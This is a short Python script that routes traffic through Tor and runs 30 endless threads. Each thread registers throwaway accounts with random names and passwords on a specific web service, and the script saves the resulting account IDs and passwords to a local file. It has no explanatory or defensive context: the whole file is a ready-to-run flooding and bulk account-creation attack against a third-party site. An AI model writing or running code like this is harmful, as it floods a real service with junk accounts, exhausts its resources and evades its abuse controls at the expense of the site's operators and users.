import requests
print(requests.get("https://api.myip.com",proxies=dict(http='socks5://127.0.0.1:9050',https='socks5://127.0.0.1:9050')).text)
from bs4 import BeautifulSoup
import random
import string
import time
import sys
import threading
ok= 0
er = 0
green = '\033[92m'
#proxies=dict(http='socks5://127.0.0.1:9050',https='socks5://127.0.0.1:9050')
def rand():
    result_str = ''.join(random.sample(string.ascii_lowercase, 8))
    return result_str
   
def boom():
	global ok
	global er
	while True:
		pasw= rand()  
		data= dict(name=rand(),password=pasw,submit="%D8%A7%DB%8C%D8%AC%D8%A7%D8%AF+%DA%86%D8%A7%D9%84%D8%B4")
		try:
			r = requests.post("https://harfeto.timefriend.net/harfeto/addId",
	data=data,
	proxies=dict(http='socks5://127.0.0.1:9050',https='socks5://127.0.0.1:9050')
)
			soup = BeautifulSoup(r.text, 'html.parser')
			save = str(soup.input["value"])+":"+pasw+"\n"
			open("chalesh_acc.txt","a+").write(save)
			ok +=1
		except:
			er += 1
		
	
	
def show():
	while True:
		sys.stdout.write(f" {green} Not Save["+str(er)+"]"+"Save ["+str(ok)+"]"+"\r")
		time.sleep(0.1)
		
		
threading.Thread(target=show).start()
for _ in range(30):
	threading.Thread(target=boom).start()